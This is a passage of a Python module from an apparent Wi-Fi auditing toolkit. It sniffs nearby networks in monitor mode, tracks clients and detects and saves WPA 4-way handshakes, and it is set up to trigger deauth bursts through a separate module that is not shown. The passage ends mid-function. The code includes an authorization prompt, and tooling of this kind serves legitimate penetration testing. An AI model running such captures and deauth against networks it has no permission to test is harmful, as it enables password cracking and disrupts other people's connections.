#!/usr/bin/env python3

import os
import queue
import re
import shutil
import sys
import time
import subprocess
import threading
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

try:
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        restore_managed_mode as core_restore_managed_mode,
        set_interface_type as core_set_interface_type,
        wait_for_monitor_settle as core_wait_for_monitor_settle,
    )
except ModuleNotFoundError:
    MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
    PROJECT_ROOT = os.path.dirname(MODULE_DIR)
    if PROJECT_ROOT not in sys.path:
        sys.path.insert(0, PROJECT_ROOT)
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        restore_managed_mode as core_restore_managed_mode,
        set_interface_type as core_set_interface_type,
        wait_for_monitor_settle as core_wait_for_monitor_settle,
    )

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
LOG_DIR = os.environ.get("SWISSKNIFE_LOG_DIR", os.path.join(PROJECT_ROOT, "log"))
DEFAULT_HANDSHAKE_DIR = os.environ.get(
    "SWISSKNIFE_HANDSHAKE_DIR", os.path.join(LOG_DIR, "handshakes")
)
HANDSHAKER_DEAUTH_VERBOSE = os.environ.get("SWISSKNIFE_HANDSHAKER_DEAUTH_VERBOSE") == "1"
DEBUG_CLIENTS = os.environ.get("SWISSKNIFE_DEBUG_CLIENTS") == "1"

DEFAULT_MONITOR_CHANNELS = (
    list(range(1, 15))
    + [
        36,
        40,
        44,
        48,
        52,
        56,
        60,
        64,
        100,
        104,
        108,
        112,
        116,
        120,
        124,
        128,
        132,
        136,
        140,
        144,
        149,
        153,
        157,
        161,
        165,
    ]
)
DEFAULT_HOP_INTERVAL = 0.8
DEFAULT_LIVE_UPDATE_INTERVAL = 0.5
MONITOR_SETTLE_SECONDS = 2.0
DEFAULT_DEAUTH_BURST_ON_SEC = 3.0
DEFAULT_DEAUTH_BURST_CYCLE_SEC = 12.0
ON_RUN_FAST_CHANNELS = list(range(1, 15))
ON_RUN_DEFAULT_SCAN_WINDOW_SEC = 6
ON_RUN_DEFAULT_HOP_INTERVAL = 0.25
ON_RUN_LIVE_UPDATE_INTERVAL = 0.25
ON_RUN_SCAN_PAUSE_SEC = 0.5
ON_RUN_DISPLAY_LIMIT = 12
ON_RUN_CONFIRM_PHRASE = "AUTHORIZED"

try:
    from scapy.all import (  # type: ignore
        AsyncSniffer,
        Dot11,
        Dot11Beacon,
        Dot11Elt,
        Dot11ProbeResp,
        EAPOL,
        PcapWriter,
    )
    from scapy.error import Scapy_Exception  # type: ignore
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False
    AsyncSniffer = None  # type: ignore[assignment]
    Dot11 = None  # type: ignore[assignment]
    Dot11Beacon = None  # type: ignore[assignment]
    Dot11Elt = None  # type: ignore[assignment]
    Dot11ProbeResp = None  # type: ignore[assignment]
    EAPOL = None  # type: ignore[assignment]
    PcapWriter = None  # type: ignore[assignment]
    Scapy_Exception = Exception  # type: ignore

# Optional local module: modules/deauth.py
try:
    import deauth
    DEAUTH_AVAILABLE = True
    DEAUTH_IMPORT_ERROR: Optional[str] = None
except Exception as exc:
    deauth = None  # type: ignore[assignment]
    DEAUTH_AVAILABLE = False
    DEAUTH_IMPORT_ERROR = str(exc)

def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def normalize_mac(mac_address: Optional[str]) -> Optional[str]:
    if not mac_address:
        return None
    return mac_address.strip().lower()


def list_network_interfaces() -> List[str]:
    return core_list_network_interfaces()


def get_interface_chipset(interface: str) -> str:
    return core_get_interface_chipset(interface)


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        display_name = f"{name} (AP running)" if name == "wlan0" else name
        label = f"{index}) {display_name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    return core_get_interface_mode(interface, fallback_iwconfig=False)


def set_interface_type(interface: str, mode: str) -> bool:
    ok, error = core_set_interface_type(
        interface,
        mode,
        enable_otherbss=(mode == "monitor"),
        settle_seconds=0.5,
    )
    if ok:
        return True
    logging.error("Failed to set %s mode: %s", mode, error or "unknown error")
    return False


def wait_for_monitor_settle(interface: str) -> None:
    _ = interface
    core_wait_for_monitor_settle(MONITOR_SETTLE_SECONDS)


def restore_managed_mode(interface: str) -> None:
    core_restore_managed_mode(interface)


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def prompt_float(prompt: str, default: float, minimum: float = 0.1) -> float:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = float(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def prompt_yes_no(prompt: str, default: bool = False) -> bool:
    default_label = "Y/n" if default else "y/N"
    raw = input(f"{prompt} ({default_label}): ").strip().lower()
    if not raw:
        return default
    return raw in {"y", "yes", "t", "true", "1"}


def build_box(lines: List[str]) -> str:
    width = max(len(line) for line in lines)
    border = "+" + "-" * (width + 2) + "+"
    body = [f"| {line.ljust(width)} |" for line in lines]
    return "\n".join([border, *body, border])


def display_scan_live(networks: int, clients: int, interface: str, status: str, remaining: int) -> None:
    lines = [
        f"Handshaker scan on {interface}",
        f"Networks: {networks}",
        f"Clients:  {clients}",
        f"Status:   {status.upper()}",
        f"Time left: {remaining}s",
    ]
    output = build_box(lines)
    if COLOR_ENABLED:
        sys.stdout.write("\033[2J\033[H" + output + "\n")
    else:
        sys.stdout.write(output + "\n")
    sys.stdout.flush()


def format_ssid(ssid: str, max_len: int = 24) -> str:
    if not ssid:
        return "<hidden>"
    cleaned = " ".join(ssid.split())
    if not cleaned:
        return "<hidden>"
    if len(cleaned) <= max_len:
        return cleaned
    return cleaned[: max_len - 3].rstrip() + "..."


def format_client_list(clients: Set[str], max_items: int = 3) -> str:
    if not clients:
        return ""
    sorted_clients = sorted(clients)
    if len(sorted_clients) <= max_items:
        return ", ".join(sorted_clients)
    remaining = len(sorted_clients) - max_items
    shown = ", ".join(sorted_clients[:max_items])
    return f"{shown} +{remaining}"


def extract_ssid(packet) -> str:
    if not packet.haslayer(Dot11Elt):
        return "<hidden>"
    elt = packet[Dot11Elt]
    while isinstance(elt, Dot11Elt):
        if elt.ID == 0:
            ssid_bytes = elt.info or b""
            if not ssid_bytes or b"\x00" in ssid_bytes:
                return "<hidden>"
            try:
                return ssid_bytes.decode("utf-8")
            except UnicodeDecodeError:
                return "<non-printable>"
        elt = elt.payload
    return "<hidden>"


def extract_channel(packet) -> Optional[int]:
    if not packet.haslayer(Dot11Elt):
        return None
    elt = packet[Dot11Elt]
    while isinstance(elt, Dot11Elt):
        if elt.ID == 3 and elt.info:
            channel = elt.info[0]
            if 1 <= channel <= 196:
                return int(channel)
        if elt.ID == 61 and elt.info:
            channel = elt.info[0]
            if 1 <= channel <= 196:
                return int(channel)
        elt = elt.payload
    return None


def parse_rsn_akm_suites(info: bytes) -> List[int]:
    if len(info) < 8:
        return []
    idx = 0
    idx += 2
    idx += 4
    if idx + 2 > len(info):
        return []
    pairwise_count = int.from_bytes(info[idx:idx + 2], "little")
    idx += 2 + pairwise_count * 4
    if idx + 2 > len(info):
        return []
    akm_count = int.from_bytes(info[idx:idx + 2], "little")
    idx += 2
    akm_types: List[int] = []
    for _ in range(akm_count):
        if idx + 4 > len(info):
            break
        akm_types.append(info[idx + 3])
        idx += 4
    return akm_types


def extract_security(packet) -> str:
    privacy = False
    wpa = False
    rsn = False
    wpa3 = False
    if packet.haslayer(Dot11Beacon):
        cap_info = packet.sprintf("%Dot11Beacon.cap%")
    else:
        cap_info = packet.sprintf("%Dot11ProbeResp.cap%")
    if "privacy" in cap_info:
        privacy = True
    elt = packet[Dot11Elt] if packet.haslayer(Dot11Elt) else None
    while isinstance(elt, Dot11Elt):
        if elt.ID == 48:
            rsn = True
            akm_types = parse_rsn_akm_suites(elt.info or b"")
            if any(akm in (8, 9) for akm in akm_types):
                wpa3 = True
        elif elt.ID == 221 and elt.info.startswith(b"\x00P\xf2\x01\x01\x00"):
            wpa = True
        elt = elt.payload
    if rsn:
        return "WPA3" if wpa3 else "WPA2"
    if wpa:
        return "WPA"
    if privacy:
        return "WEP"
    return "OPEN"


def is_unicast(mac_address: Optional[str]) -> bool:
    if not is_valid_mac(mac_address):
        return False
    try:
        first_octet = int(mac_address.split(":")[0], 16)
    except (ValueError, IndexError):
        return False
    return (first_octet & 1) == 0


def is_valid_mac(mac_address: Optional[str]) -> bool:
    lower = normalize_mac(mac_address)
    if not lower:
        return False
    if lower in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
        return False
    if lower.startswith(("01:00:5e", "01:80:c2", "33:33")):
        return False
    if len(lower.split(":")) != 6:
        return False
    return True


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    security: str
    channel: Optional[int] = None
    clients: Set[str] = field(default_factory=set)
    seen_stations: Set[str] = field(default_factory=set)
    probing_stations: Set[str] = field(default_factory=set)

    def update_security(self, new_security: str) -> None:
        priority = {"OPEN": 0, "WEP": 1, "WPA": 2, "WPA2": 3, "WPA3": 4}
        if priority.get(new_security, -1) > priority.get(self.security, -1):
            self.security = new_security

    def update_channel(self, new_channel: Optional[int]) -> None:
        if new_channel is not None:
            self.channel = new_channel


def observe_client_for_ap(aps: Dict[str, AccessPoint], dot11) -> None:
    """Track associated clients (stations) per AP.

    We count *associated* clients only from DATA frames (type=2). Management
    frames (probe/auth/assoc) are not stable indicators of association and are
    intentionally excluded from the main client count.

    Robustness:
    - Uses ToDS/FromDS when available.
    - Falls back to matching known BSSIDs in addr1/addr2 when flags are unreliable.
    """
    if not dot11:
        return

    frame_type = getattr(dot11, "type", None)

    addr1 = normalize_mac(getattr(dot11, "addr1", None))
    addr2 = normalize_mac(getattr(dot11, "addr2", None))
    addr3 = normalize_mac(getattr(dot11, "addr3", None))

    # Management frames (probe/auth/assoc/etc.) can help with visibility, but we
    # keep them separate from the "associated clients" count.
    if frame_type == 0:
        subtype = getattr(dot11, "subtype", None)
        bssid = addr3

        def add_station(target_bssid: Optional[str], station: Optional[str], *, probe: bool = False) -> None:
            if not target_bssid or target_bssid not in aps:
                return
            if not station or station == target_bssid or not is_unicast(station):
                return
            if probe:
                aps[target_bssid].probing_stations.add(station)
            else:
                aps[target_bssid].seen_stations.add(station)

        # 802.11 management subtypes
        # 0 assoc req, 1 assoc resp, 2 reassoc req, 3 reassoc resp, 4 probe req, 5 probe resp,
        # 8 beacon, 10 disassoc, 11 auth, 12 deauth
        if subtype in (0, 2, 10, 11, 12):
            # STA -> AP (usually). addr2 is the STA, addr3 is the BSSID/AP.
            add_station(bssid, addr2)
            return
        if subtype in (1, 3):
            # AP -> STA (usually). addr1 is the STA, addr3 is the BSSID/AP.
            add_station(bssid, addr1)
            return
        if subtype == 4:
            # Probe request. addr2 is the STA. addr3 may be broadcast or a directed BSSID.
            add_station(bssid, addr2, probe=True)
            return
        if subtype == 5:
            # Probe response. addr1 is the STA, addr3 is the BSSID/AP.
            add_station(bssid, addr1, probe=True)
            return
        return

    if frame_type != 2:
        return

    try:
        fcfield = int(getattr(dot11, "FCfield", 0))
    except Exception:
        fcfield = 0

    to_ds = bool(fcfield & 0x1)
    from_ds = bool(fcfield & 0x2)

    bssid: Optional[str] = None
    station: Optional[str] = None

    if to_ds and not from_ds:
        # STA -> AP
        bssid = addr1
        station = addr2
    elif from_ds and not to_ds:
        # AP -> STA
        bssid = addr2
        station = addr1
    elif not to_ds and not from_ds:
        # IBSS/ad-hoc (no DS). Treat addr3 as "network id" and addr2 as a station.
        bssid = addr3
        station = addr2
    else:
        # WDS/mesh (4-address) frames: no single BSSID; ignore for association counting.
        return

    # Fallback: if flags are unreliable, try to match known BSSIDs in addr1/addr2.
    if bssid not in aps:
        if addr1 and addr1 in aps:
            bssid = addr1
            station = addr2
        elif addr2 and addr2 in aps:
            bssid = addr2
            station = addr1

    if not bssid or bssid not in aps:
        return
    if not station or station == bssid or not is_unicast(station):
        return

    aps[bssid].clients.add(station)


def channel_hopper(interface: str, channels: List[int], interval: float, stop_event: threading.Event) -> None:
    if not channels:
        return
    while not stop_event.is_set():
        for channel in channels:
            if stop_event.is_set():
                break
            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            time.sleep(interval)


def scan_networks(
    interface: str,
    duration_seconds: int,
    channels: List[int],
    hop_interval: float,
    update_interval: float,
) -> Dict[str, AccessPoint]:
    aps: Dict[str, AccessPoint] = {}
    aps_lock = threading.Lock()
    debug_total = 0
    debug_mgmt = 0
    debug_ctrl = 0
    debug_data = 0
    debug_data_known = 0

    # Best-effort: ensure monitor capture includes other BSS traffic.
    subprocess.run(
        ["iw", "dev", interface, "set", "monitor", "otherbss"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )

    def handle_packet(packet) -> None:
        nonlocal debug_total, debug_mgmt, debug_ctrl, debug_data, debug_data_known
        if not packet.haslayer(Dot11):
            return
        dot11 = packet[Dot11]

        debug_total += 1
        if getattr(dot11, "type", None) == 0:
            debug_mgmt += 1
        elif getattr(dot11, "type", None) == 1:
            debug_ctrl += 1
        elif getattr(dot11, "type", None) == 2:
            debug_data += 1

        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            bssid = normalize_mac(dot11.addr3 or dot11.addr2)
            if not bssid or not is_valid_mac(bssid):
                return
            ssid = extract_ssid(packet)
            security = extract_security(packet)
            channel = extract_channel(packet)
            with aps_lock:
                ap = aps.get(bssid)
                if ap is None:
                    aps[bssid] = AccessPoint(ssid=ssid, bssid=bssid, security=security, channel=channel)
                else:
                    if ap.ssid == "<hidden>" and ssid != "<hidden>":
                        ap.ssid = ssid
                    ap.update_security(security)
                    ap.update_channel(channel)

        with aps_lock:
            if getattr(dot11, "type", None) == 2:
                a1 = normalize_mac(getattr(dot11, "addr1", None))
                a2 = normalize_mac(getattr(dot11, "addr2", None))
                if (a1 and a1 in aps) or (a2 and a2 in aps):
                    debug_data_known += 1
            observe_client_for_ap(aps, dot11)

    sniffer: Optional[AsyncSniffer] = None
    status = "starting"
    last_restart = 0.0
    last_error = ""
    restart_delay = 1.0

    def start_sniffer() -> None:
        nonlocal sniffer, status, last_restart, last_error
        now = time.time()
        if now - last_restart < restart_delay:
            status = "restarting"
            return
        last_restart = now
        try:
            sniffer = AsyncSniffer(iface=interface, prn=handle_packet, store=False)
            sniffer.start()
            status = "running"
        except Exception as exc:
            status = "error"
            if str(exc) != last_error:
                logging.error("Sniffer failed to start: %s", exc)
                last_error = str(exc)
            sniffer = None

    start_sniffer()

    stop_event = threading.Event()
    hopper_thread: Optional[threading.Thread] = None
    if channels:
        hopper_thread = threading.Thread(target=channel_hopper, args=(interface, channels, hop_interval, stop_event), daemon=True)
        hopper_thread.start()

    end_time = time.time() + max(1, duration_seconds)
    try:
        while time.time() < end_time:
            if sniffer is None or not getattr(sniffer, "running", False):
                start_sniffer()
            with aps_lock:
                networks = len(aps)
                clients = sum(len(ap.clients) for ap in aps.values())
            remaining = max(0, int(end_time - time.time()))
            display_scan_live(networks, clients, interface, status, remaining)
            time.sleep(max(0.2, update_interval))
    finally:
        stop_event.set()
        try:
            if sniffer and getattr(sniffer, "running", False):
                sniffer.stop()
        except Scapy_Exception:
            pass

        if hopper_thread:
            hopper_thread.join(timeout=2)

    if DEBUG_CLIENTS:
        logging.info("")
        logging.info(style("Client debug:", STYLE_BOLD))
        logging.info(
            "  Dot11 frames: %d | mgmt: %d | ctrl: %d | data: %d",
            debug_total,
            debug_mgmt,
            debug_ctrl,
            debug_data,
        )
        logging.info("  Data frames with known BSSID (addr1/addr2): %d", debug_data_known)

    return aps


def sorted_access_points(aps: Dict[str, AccessPoint]) -> List[AccessPoint]:
    return sorted(aps.values(), key=lambda ap: len(ap.clients), reverse=True)


def merge_access_point_snapshots(
    cumulative: Dict[str, AccessPoint],
    latest: Dict[str, AccessPoint],
) -> None:
    for bssid, incoming in latest.items():
        current = cumulative.get(bssid)
        if current is None:
            cumulative[bssid] = AccessPoint(
                ssid=incoming.ssid,
                bssid=incoming.bssid,
                security=incoming.security,
                channel=incoming.channel,
                clients=set(incoming.clients),
                seen_stations=set(incoming.seen_stations),
                probing_stations=set(incoming.probing_stations),
            )
            continue
        if current.ssid == "<hidden>" and incoming.ssid != "<hidden>":
            current.ssid = incoming.ssid
        current.update_security(incoming.security)
        current.update_channel(incoming.channel)
        current.clients.update(incoming.clients)
        current.seen_stations.update(incoming.seen_stations)
        current.probing_stations.update(incoming.probing_stations)


def format_network_lines(sorted_aps: List[AccessPoint], max_items: Optional[int] = None) -> List[str]:
    if not sorted_aps:
        return [color_text("No networks found.", COLOR_WARNING)]

    lines: List[str] = [style("Observed networks (sorted by clients):", STYLE_BOLD)]
    visible_aps = sorted_aps[:max_items] if max_items else sorted_aps
    for index, ap in enumerate(visible_aps, start=1):
        ssid_label = format_ssid(ap.ssid)
        channel_label = str(ap.channel) if ap.channel else "?"

        security_color = (
            COLOR_SUCCESS
            if ap.security in {"WPA", "WPA2"}
            else COLOR_WARNING
            if ap.security == "WPA3"
            else COLOR_DIM
        )
        security_label = color_text(ap.security, security_color)

        client_count = len(ap.clients)
        client_list = format_client_list(ap.clients)
        client_label = f"clients {client_count}"
        if client_list:
            client_label += f" ({client_list})"

        label = f"{index}) {ssid_label} ({ap.bssid}) -"
        details = f"ch {channel_label} | {security_label} | {client_label}"
        lines.append(f"  {color_text(label, COLOR_HIGHLIGHT)} {details}")
    if max_items and len(sorted_aps) > max_items:
        lines.append(color_text(f"  ... +{len(sorted_aps) - max_items} more", COLOR_DIM))
    return lines


def select_access_point(sorted_aps: List[AccessPoint]) -> Optional[AccessPoint]:
    if not sorted_aps:
        return None
    while True:
        choice = input(f"{style('Select target AP', STYLE_BOLD)} (number, or 'q' to quit): ").strip().lower()
        if choice in ("q", "quit", "exit"):
            return None
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(sorted_aps):
                return sorted_aps[idx - 1]
        logging.warning("Invalid selection. Try again.")


def select_handshaker_mode() -> str:
    logging.info(style("Mode:", STYLE_BOLD))
    logging.info("  %s Classic handshaker", color_text("[1]", COLOR_HIGHLIGHT))
    logging.info("      Scan, select one authorized AP, then capture.")
    logging.info("  %s ON RUN handshaker", color_text("[2]", COLOR_HIGHLIGHT))
    logging.info("      Continuous passive survey ranked by active clients.")
    logging.info("")

    while True:
        choice = input(f"{style('Select mode', STYLE_BOLD)} (1/2): ").strip().lower()
        if choice in ("1", "classic", "c"):
            return "classic"
        if choice in ("2", "onrun", "on-run", "on run", "run", "r"):
            return "on_run"
        logging.warning("Invalid selection. Try again.")


def confirm_on_run_disclaimer() -> bool:
    logging.info("")
    logging.info(style("ON RUN safety gate:", COLOR_WARNING, STYLE_BOLD))
    logging.info(
        "This mode observes nearby wireless traffic and ranks APs by visible activity."
    )
    logging.info(
        "Automated deauth bursts against arbitrary surrounding networks are not supported."
    )
    logging.info(
        "Continue only for networks and equipment you own or have explicit written authorization to assess."
    )
    logging.info("")
    answer = input(
        f"Type {style(ON_RUN_CONFIRM_PHRASE, COLOR_SUCCESS, STYLE_BOLD)} to continue: "
    ).strip()
    return answer == ON_RUN_CONFIRM_PHRASE


def set_interface_channel(interface: str, channel: int) -> bool:
    result = subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True, check=False)
    if result.returncode != 0:
        logging.error("Failed to set channel %s: %s", channel, result.stderr.strip() or "unknown error")
        return False
    time.sleep(0.3)
    return True


def packet_matches_bssid(packet, bssid: str) -> bool:
    if Dot11 is None:
        return False
    if not packet.haslayer(Dot11):
        return False
    needle = normalize_mac(bssid)
    if not needle:
        return False
    dot11 = packet[Dot11]
    return needle in {
        normalize_mac(dot11.addr1),
        normalize_mac(dot11.addr2),
        normalize_mac(dot11.addr3),
    }


# EAPOL-Key Key Information bit masks (host order after BE16 parse):
# - Key Type (pairwise): bit 3
# - Install:             bit 6
# - ACK:                 bit 7
# - MIC:                 bit 8
# - Secure:              bit 9
KEY_INFO_PAIRWISE = 1 << 3
KEY_INFO_INSTALL = 1 << 6
KEY_INFO_ACK = 1 << 7
KEY_INFO_MIC = 1 << 8
KEY_INFO_SECURE = 1 << 9
EAPOL_TYPE_KEY = 3
EAPOL_KEY_MIN_LEN = 95
HANDSHAKE_IDLE_TIMEOUT_SEC = 8.0


@dataclass
class EapolKeyFrame:
    client: str
    from_ap: bool
    replay_counter: int
    key_info: int
    key_data_length: int
    descriptor_type: int
    pairwise: bool
    install: bool
    ack: bool
    mic: bool
    secure: bool


@dataclass
class HandshakeProgress:
    stage: int = 0
    replay_counter: int = 0
    last_seen: float = 0.0


def extract_eapol_client(dot11, bssid: str) -> Optional[Tuple[str, bool]]:
    """Resolve station MAC and direction for EAPOL key frames.

    Returns (client_mac, from_ap), where from_ap indicates AP -> client direction.
    """
    bssid_norm = normalize_mac(bssid)
    if not bssid_norm:
        return None

    addr1 = normalize_mac(getattr(dot11, "addr1", None))
    addr2 = normalize_mac(getattr(dot11, "addr2", None))

    if addr2 == bssid_norm and addr1 and addr1 != bssid_norm and is_unicast(addr1):
        return addr1, True
    if addr1 == bssid_norm and addr2 and addr2 != bssid_norm and is_unicast(addr2):
        return addr2, False

    try:
        fcfield = int(getattr(dot11, "FCfield", 0))
    except Exception:
        fcfield = 0
    to_ds = bool(fcfield & 0x1)
    from_ds = bool(fcfield & 0x2)

    if from_ds and not to_ds and addr1 and addr1 != bssid_norm and is_unicast(addr1):
        return addr1, True
    if to_ds and not from_ds and addr2 and addr2 != bssid_norm and is_unicast(addr2):
        return addr2, False
    return None


def parse_eapol_key_frame(packet, bssid: str) -> Optional[EapolKeyFrame]:
    """Parse an EAPOL-Key frame from a packet and return key fields for validation."""
    if Dot11 is None or EAPOL is None:
        return None
    if not packet.haslayer(Dot11) or not packet.haslayer(EAPOL):
        return None
    if not packet_matches_bssid(packet, bssid):
        return None

    dot11 = packet[Dot11]
    client_info = extract_eapol_client(dot11, bssid)
    if not client_info:
        return None
    client, from_ap = client_info

    try:
        eapol_raw = bytes(packet[EAPOL])
    except Exception:
        return None

    if len(eapol_raw) < 4:
        return None
    if eapol_raw[1] != EAPOL_TYPE_KEY:
        return None

    payload_len = int.from_bytes(eapol_raw[2:4], "big")
    if payload_len < EAPOL_KEY_MIN_LEN:
        return None
    if len(eapol_raw) < 4 + payload_len:
        return None

    key_payload = eapol_raw[4 : 4 + payload_len]
    if len(key_payload) < EAPOL_KEY_MIN_LEN:
        return None

    descriptor_type = key_payload[0]
    if descriptor_type not in (2, 254):
        return None

    key_info = int.from_bytes(key_payload[1:3], "big")
    replay_counter = int.from_bytes(key_payload[5:13], "big")
    key_data_length = int.from_bytes(key_payload[93:95], "big")

    return EapolKeyFrame(
        client=client,
        from_ap=from_ap,
        replay_counter=replay_counter,
        key_info=key_info,
        key_data_length=key_data_length,
        descriptor_type=descriptor_type,
        pairwise=bool(key_info & KEY_INFO_PAIRWISE),
        install=bool(key_info & KEY_INFO_INSTALL),
        ack=bool(key_info & KEY_INFO_ACK),
        mic=bool(key_info & KEY_INFO_MIC),
        secure=bool(key_info & KEY_INFO_SECURE),
    )


def classify_4way_message(frame: EapolKeyFrame) -> Optional[int]:
    """Classify frame as WPA(2) 4-way message number (1..4)."""
    if not frame.pairwise:
        return None
    if frame.from_ap and frame.ack and not frame.mic:
        return 1
    if (not frame.from_ap) and (not frame.ack) and frame.mic and not frame.secure:
        return 2
    if frame.from_ap and frame.ack and frame.mic and frame.secure:
        return 3
    if (not frame.from_ap) and (not frame.ack) and frame.mic and frame.secure:
        return 4
    return None


def update_handshake_progress(
    states: Dict[str, HandshakeProgress],
    frame: EapolKeyFrame,
    *,
    now: Optional[float] = None,
    idle_timeout: float = HANDSHAKE_IDLE_TIMEOUT_SEC,
) -> Tuple[bool, bool, int]:
    """Advance per-client handshake state.

    Returns: (stage_advanced, handshake_completed, message_number)
    """
    current_time = now if now is not None else time.time()
    message_number = classify_4way_message(frame)
    if message_number is None:
        return False, False, 0

    progress = states.get(frame.client, HandshakeProgress())
    if progress.last_seen and idle_timeout > 0 and (current_time - progress.last_seen) > idle_timeout:
        progress = HandshakeProgress()

    stage_advanced = False
    handshake_completed = False

    if message_number == 1:
        progress.stage = 1
        progress.replay_counter = frame.replay_counter
        stage_advanced = True
    elif message_number == 2:
        if progress.stage == 1 and frame.replay_counter == progress.replay_counter:
            progress.stage = 2
            stage_advanced = True
    elif message_number == 3:
        if progress.stage >= 2 and frame.replay_counter >= progress.replay_counter:
            if progress.stage != 3 or frame.replay_counter != progress.replay_counter:
                stage_advanced = True
            progress.stage = 3
            progress.replay_counter = frame.replay_counter
    elif message_number == 4:
        if progress.stage == 3 and frame.replay_counter == progress.replay_counter:
            handshake_completed = True
            stage_advanced = True
            progress = HandshakeProgress()

    progress.last_seen = current_time
    states[frame.client] = progress
    return stage_advanced, handshake_completed, message_number


def sanitize_capture_basename(ssid: str, fallback: str = "hidden", max_len: int = 24) -> str:
    if not ssid or ssid in {"<hidden>", "<non-printable>"}:
        ssid = fallback
    cleaned = " ".join(str(ssid).split())
    cleaned = re.sub(r"[^A-Za-z0-9_-]+", "_", cleaned).strip("_")
    if not cleaned:
        cleaned = fallback
    if len(cleaned) > max_len:
        cleaned = cleaned[:max_len].rstrip("_")
    return cleaned


def next_handshake_pcap_path(output_dir: str, ssid: str) -> str:
    base = sanitize_capture_basename(ssid)
    first = os.path.join(output_dir, f"{base}.pcap")
    if not os.path.exists(first):
        return first
    for index in range(2, 10000):
        candidate = os.path.join(output_dir, f"{base}_{index}.pcap")
        if not os.path.exists(candidate):
            return candidate
    return os.path.join(output_dir, f"{base}_{int(time.time())}.pcap")


def capture_full_handshakes(
    interface: str,
    ap: AccessPoint,
    total_duration_sec: Optional[int] = None,
    deauth_burst_on_sec: float = DEFAULT_DEAUTH_BURST_ON_SEC,
    deauth_burst_cycle_sec: float = DEFAULT_DEAUTH_BURST_CYCLE_SEC,
    stop_on_first_handshake: bool = True,
    output_dir: str = DEFAULT_HANDSHAKE_DIR,
) -> Optional[Dict]:
    os.makedirs(output_dir, exist_ok=True)

    pcap_path = next_handshake_pcap_path(output_dir, ap.ssid)

    writer = None
    sniffer = None
    handshake_count = 0
    total_packets = 0
    eapol_count = 0
    clients_with_eapol = set()
    message_counters: Dict[int, int] = {1: 0, 2: 0, 3: 0, 4: 0}

    eapol_states: Dict[str, HandshakeProgress] = {}

    start_time: Optional[float] = None
    started = False
    interrupted = False
    stop_reason = "unknown"

    if total_duration_sec is not None and total_duration_sec < 1:
        total_duration_sec = None

    deauth_burst_on_sec = float(deauth_burst_on_sec)
    if deauth_burst_on_sec > 0:
        deauth_burst_on_sec = max(0.5, deauth_burst_on_sec)
        deauth_burst_cycle_sec = max(
            deauth_burst_on_sec + 0.5,
            float(deauth_burst_cycle_sec),
        )
    else:
        deauth_burst_on_sec = 0.0
        deauth_burst_cycle_sec = float(deauth_burst_cycle_sec)

    stats_lock = threading.Lock()
    events: "queue.SimpleQueue[tuple[Optional[str], str]]" = queue.SimpleQueue()
    known_clients = sorted(client for client in ap.clients if is_valid_mac(client))
    observed_clients: Set[str] = set(known_clients)
    client_target_index = 0
    burst_deauth_count = max(4, min(128, int(round(deauth_burst_on_sec * 10))))

    def terminal_columns() -> int:
        try:
            return max(40, int(shutil.get_terminal_size((80, 20)).columns))
        except Exception:
            return 80

    def clear_status_line() -> None:
        if not sys.stdout.isatty():
            return
        width = terminal_columns()
        sys.stdout.write("\r" + (" " * (width - 1)) + "\r")
        sys.stdout.flush()

    def render_status_line(text: str) -> None:
        if not sys.stdout.isatty():
            return
        width = terminal_columns()
        sys.stdout.write("\r" + text.ljust(width - 1)[: width - 1])
        sys.stdout.flush()

    def emit_event(message: str, color: Optional[str] = None) -> None:
        clear_status_line()
        logging.info(color_text(message, color) if color else message)

    try:
        writer = PcapWriter(pcap_path, append=False, sync=True)

